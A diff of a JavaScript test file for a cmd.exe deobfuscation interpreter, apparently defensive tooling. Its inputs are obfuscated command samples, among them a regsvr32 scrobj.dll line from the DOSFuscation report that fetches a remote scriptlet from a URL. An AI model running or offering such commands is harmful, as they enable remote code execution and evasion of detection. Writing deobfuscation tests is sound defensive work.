@@ -17,7 +17,16 @@ describe("Interpreter", () => {
         it("should return an expanded command as a 1-element array", () => {
 
             const input  = `echo %comspec%`,
-                  output = [`echo C:\\Windows\\System32\\cmd.exe`];
+                  output = [
+                      {
+                          command: {
+                              name: "echo",
+                              line: "C:\\Windows\\System32\\cmd.exe"
+                          },
+                          options: {},
+                          variables: {}
+                      }
+                  ];
             assert.deepEqual(interpret(input), output);
         });
     });
@@ -54,20 +63,24 @@ describe("Interpreter", () => {
 
             it("should return the input without escapes", () => {
                 const input  = `^p^o^w^e^r^s^h^e^l^l`,
-                      output = ["powershell"];
+                      output = [{
+                          command: { name: "powershell", line: "" },
+                          options: {},
+                          variables: {}
+                      }];
                 assert.deepEqual(interpret(input), output);
             });
 
             it("should disable escapes when 'strip_escapes' is false", () => {
                 const input  = `^p^o^w^e^r^s^h^e^l^l`,
-                      output = [input];
+                      output = [{ command: { name: input, line: "" }, options: {}, variables: {}}];
                 assert.deepEqual(interpret(input, { strip_escapes: false }), output);
             });
         });
 
-        xdescribe("Strings", () => {
+        describe("Strings", () => {
 
-            it("should concatenate runs of regular strings and literals without delims", () => {
+            xit("should concatenate runs of regular strings and literals without delims", () => {
                 const input  = `"abc"def"ghi"`,
                       output = [`"abcdefghi"`];
                 assert.deepEqual(interpret(input), output);
@@ -75,11 +88,11 @@ describe("Interpreter", () => {
 
             it("should strip empty strings", () => {
                 const input  = `w""scr""ipt""`,
-                      output = [`wscript`];
+                      output = [{ command: { name: "wscript", line: ""}, options: {}, variables: {}}];
                 assert.deepEqual(interpret(input), output);
             });
 
-            it("should unify strings or literals not separated by a delimiter", () => {
+            xit("should unify strings or literals not separated by a delimiter", () => {
 
                 const tests = [
                     {
@@ -162,23 +175,115 @@ describe("Interpreter", () => {
                     input: `((calc.exe))`,
                     output: `calc`,
                     msg:    "Strip parens, identify the exe."
+                },
+                {
+                    input: `"set x=y"`,
+                    output: "set",
+                    msg:    "Identify 'set' between quotes."
                 }
             ];
 
             tests.forEach(
-                t => assert.deepEqual(identify_command(tokenise(t.input)).cmd, t.output, t.msg)
+                t => assert.deepEqual(identify_command(tokenise(t.input)).command, t.output, t.msg)
             );
+        });
+
+        it("should trim any trailing delimiters immediately after the identified cmd", () => {
+
+            const tests = [
+                {
+                    input:  `regsvr32 foo bar`,
+                    output: ["LITERAL", "DELIMITER", "LITERAL"]
+                },
+                {
+                    input:  `regsvr32     foo bar`,
+                    output: ["LITERAL", "DELIMITER", "LITERAL"]
+                },
+                {
+                    input:  `regsvr32,,, ;;;     foo bar`,
+                    output: ["LITERAL", "DELIMITER", "LITERAL"]
+                },
+                {
+                    input:  `regsvr32,foo bar`,
+                    output: ["LITERAL", "DELIMITER", "LITERAL"]
+                },
+                {
+                    input:  `regsvr32;foo bar`,
+                    output: ["LITERAL", "DELIMITER", "LITERAL"]
+                },
+                {
+                    input: `regsvr32`,
+                    output: []
+                }
+            ];
+
+            tests.forEach(t => {
+                let ident = identify_command(tokenise(t.input)).rest.map(x => x.name);
+                assert.deepEqual(ident, t.output);
+            });
         });
     });
 
     describe("Running commands", () => {
 
-        xdescribe("From FireEye DOSFuscation Report", () => {
+        describe("Context building", () => {
 
-            it("should clean-up regscr32 output", () => {
+            it("should create nested contexts when using nested cmd.exe instances", () => {
+
+                const input   = `cmd /c "ca""lc"`,
+                      output  = [
+                          {
+                              command: { name: `cmd`, line: `/c "calc"` },
+                              variables: {},
+                              options: { run_then_terminate: true }
+                          },
+                          {
+                              command: { name: "calc", line: "" },
+                              variables: {},
+                              options: {}
+                          }
+                      ];
+
+                let context = interpret(input);
+                assert.deepEqual(context, output);
+            });
+
+            it("should introduce envvars with SET when SET is a sub-command", () => {
+
+                const input  = `cmd /c "set x=y"`,
+                      output = [
+                          {
+                              command: { name: `cmd`, line: `/c "set x=y"` },
+                              variables: { },
+                              options: { run_then_terminate: true }
+                          },
+                          {
+                              command: { name: `set`, line: "x=y" },
+                              variables: { x: "y" },
+                              options: {}
+                          }
+                      ];
+
+                let context = interpret(input);
+                assert.deepEqual(context, output);
+            });
+        });
+
+        describe("From FireEye DOSFuscation Report", () => {
+
+            it("should clean-up regsvr32 output", () => {
                 const input  = `regsvr32.exe /s /n /u /i:"h"t"t"p://github.com/a.jpg scrobj.dll`,
-                      output = `regsvr32.exe /s /n /u /i:"http://github.com/a.jpg" scrobj.dll`;
-                assert.deepEqual(interpret(input), [output]);
+                      output = [
+                          {
+                              command: {
+                                  name: "regsvr32",
+                                  line: `/s /n /u /i:"http://github.com/a.jpg" scrobj.dll`
+                              },
+                              options: {},
+                              variables: {}
+                          }
+                      ];
+                assert.deepEqual(interpret(input), output);
             });
         });
     });
